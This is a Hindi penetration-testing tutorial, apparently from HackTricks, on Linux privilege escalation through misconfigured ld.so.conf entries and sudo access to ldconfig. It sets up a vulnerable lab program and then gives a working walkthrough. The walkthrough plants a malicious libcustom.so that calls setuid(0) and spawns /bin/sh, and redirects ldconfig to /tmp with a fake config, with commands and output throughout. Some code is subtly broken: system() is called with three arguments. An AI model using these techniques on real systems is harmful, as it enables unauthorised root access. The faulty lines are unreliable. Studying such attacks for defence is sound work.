# ld.so प्रिवेस्क एक्सप्लॉइट उदाहरण

{{#include ../../banners/hacktricks-training.md}}

## वातावरण तैयार करें

अगले अनुभाग में आप उन फ़ाइलों का कोड पा सकते हैं जिन्हें हम वातावरण तैयार करने के लिए उपयोग करने जा रहे हैं

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **अपने मशीन में** उन फ़ाइलों को उसी फ़ोल्डर में **बनाएँ**
2. **लाइब्रेरी को** **संकलित** करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **कॉपी** करें: `sudo cp libcustom.so /usr/lib` (रूट प्रिविलेज)
4. **कार्यकारी फ़ाइल को** **संकलित** करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### वातावरण की जाँच करें

जाँच करें कि _libcustom.so_ _/usr/lib_ से **लोड** हो रहा है और कि आप बाइनरी को **कार्यन्वित** कर सकते हैं।
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

इस परिदृश्य में हम मान लेंगे कि **किसी ने _/etc/ld.so.conf/_ के अंदर एक कमजोर प्रविष्टि बनाई है**:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
खतरे में पड़ा फ़ोल्डर _/home/ubuntu/lib_ है (जहाँ हमारे पास लिखने की अनुमति है)।\
**डाउनलोड और संकलित करें** निम्नलिखित कोड को उस पथ के अंदर:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
अब जब हमने **गलत कॉन्फ़िगर किए गए** पथ के अंदर **दुष्ट libcustom लाइब्रेरी बनाई है**, हमें **रीबूट** का इंतज़ार करना होगा या रूट उपयोगकर्ता को **`ldconfig`** चलाने के लिए कहना होगा (_यदि आप इस बाइनरी को **sudo** के रूप में चला सकते हैं या इसमें **suid बिट** है, तो आप इसे स्वयं चला सकेंगे_)।

एक बार जब यह हो जाता है, तो **फिर से जांचें** कि `sharevuln` निष्पादन योग्य `libcustom.so` लाइब्रेरी को कहाँ से लोड कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह **`/home/ubuntu/lib` से लोड हो रहा है** और यदि कोई उपयोगकर्ता इसे निष्पादित करता है, तो एक शेल निष्पादित होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> ध्यान दें कि इस उदाहरण में हमने विशेषाधिकारों को बढ़ाया नहीं है, लेकिन निष्पादित किए गए आदेशों को संशोधित करके और **रूट या अन्य विशेषाधिकार प्राप्त उपयोगकर्ता के द्वारा कमजोर बाइनरी को निष्पादित करने की प्रतीक्षा करके** हम विशेषाधिकार बढ़ाने में सक्षम होंगे।

### अन्य गलत कॉन्फ़िगरेशन - समान कमजोरियाँ

पिछले उदाहरण में हमने एक गलत कॉन्फ़िगरेशन का अनुकरण किया जहाँ एक व्यवस्थापक ने **`/etc/ld.so.conf.d/` के अंदर एक कॉन्फ़िगरेशन फ़ाइल के अंदर एक गैर-विशेषाधिकार प्राप्त फ़ोल्डर सेट किया**।\
लेकिन अन्य गलत कॉन्फ़िगरेशन भी हैं जो समान कमजोरियों का कारण बन सकते हैं, यदि आपके पास **`/etc/ld.so.conf.d` के अंदर कुछ **कॉन्फ़िग फ़ाइल** में लिखने की अनुमति है, `/etc/ld.so.conf.d` फ़ोल्डर में या `/etc/ld.so.conf` फ़ाइल में, तो आप समान कमजोरियों को कॉन्फ़िगर कर सकते हैं और इसका लाभ उठा सकते हैं।

## शोषण 2

**मान लीजिए कि आपके पास `ldconfig` पर sudo विशेषाधिकार हैं**।\
आप `ldconfig` को **कॉन्फ़ फ़ाइलों को कहाँ से लोड करना है, यह इंगित कर सकते हैं**, इसलिए हम इसका लाभ उठाकर `ldconfig` को मनमाने फ़ोल्डर लोड करने के लिए कह सकते हैं।\
तो, चलिए "/tmp" को लोड करने के लिए आवश्यक फ़ाइलें और फ़ोल्डर बनाते हैं:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **पिछले एक्सप्लॉइट** में संकेत दिया गया है, **`/tmp` के अंदर दुर्भावनापूर्ण लाइब्रेरी बनाएं**।\
और अंत में, चलिए पथ लोड करते हैं और जांचते हैं कि बाइनरी लाइब्रेरी को कहाँ से लोड कर रही है:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo विशेषाधिकार होने से आप उसी कमजोरियों का लाभ उठा सकते हैं।**

{{#include ../../banners/hacktricks-training.md}}
